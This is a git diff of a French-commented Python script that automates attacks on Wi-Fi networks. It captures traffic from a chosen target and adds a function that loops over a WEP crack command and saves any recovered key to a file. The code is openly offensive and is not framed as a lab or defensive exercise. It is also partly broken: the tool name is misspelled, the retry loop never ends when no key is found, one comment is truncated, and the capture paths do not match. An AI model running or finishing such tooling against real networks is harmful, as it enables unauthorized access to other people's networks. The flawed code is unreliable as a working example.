@@ -176,28 +176,21 @@ def capture_from_target_json(interface, attack_type, target_path="Target/target.
             )
             
             if attack_type == "WPA":
-                # Capturer les IV et Deduire la clé
-                
-                time.sleep(30)
-                
-                # Appel la fonction pour récupérer le nombre d'IV
-                get_iv_count("Capture/capture-01.csv")
+                # Appel la fonction pour 
                 
                 # Arrêt du processus après la capture
                 process.terminate()
                 print("Processus de capture terminé.")
                 
         
-            elif attack_type == "WEP":
-                # Capturer les IV et Deduire la clé
-                time.sleep(30)
+            elif attack_type == "WEP":                
+                # Appel la fonction pour récupérer le nombre d'IV
+                get_iv_count("Capture/capture-01.csv")
+                crack_password_wep(capture_file="capture-01.cap", output_file="password.txt")
                 
                 # Arrêt du processus après la capture
                 process.terminate()
                 print("Processus de capture terminé.")
-                
-                # Appel la fonction pour récupérer le nombre d'IV
-                get_iv_count("Capture/capture-01.csv")
 
         
             elif attack_type == "WPS":
@@ -216,7 +209,38 @@ def capture_from_target_json(interface, attack_type, target_path="Target/target.
     except Exception as e:
         print(f"Une erreur inattendue s'est produite : {str(e)}")
         
+
+# Crack WEP
+def crack_password_wep(capture_file="Capture/capture-01.cap", output_file="password.txt"):
+    """
+    Automatise le cracking du mot de passe avec airecrack-ng pour le WEP
+    et sauvegarde le mot de passe trouvé dans un fichier.
+    
+    :param capture_file: Le fichier de capture contenant les données pour le crack (par défaut "Capture/capture-01.cap").
+    :param output_file: Le fichier où sauvegarder le mot de passe trouvé.
+    """
+    try:
+        while True:
+            command = f"sudo airecrack-ng {capture_file}"
+            result = subprocess.run(command, shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            
+            if result.returncode == 0:
+                output = result.stdout
+                for line in output.splitlines():
+                    if "KEY FOUND!" in line:
+                        password = line.split()[-1].strip()
+                        with open(output_file, "w") as file:
+                            file.write(f"Mot de passe trouvé : {password}\n")
+                        print(f"[SUCCESS] Mot de passe trouvé : {password}")
+                        print(f"Mot de passe sauvegardé dans : {output_file}")
+                        return
+            
+    except FileNotFoundError:
+        print(f"Erreur : Le fichier {capture_file} n'existe pas.")
+    except Exception as e:
+        print(f"Une erreur inattendue s'est produite : {str(e)}")
         
+              
         
         
 #DANS CETTE DEF, JE VEUX lire le  noombre d'iv récolté
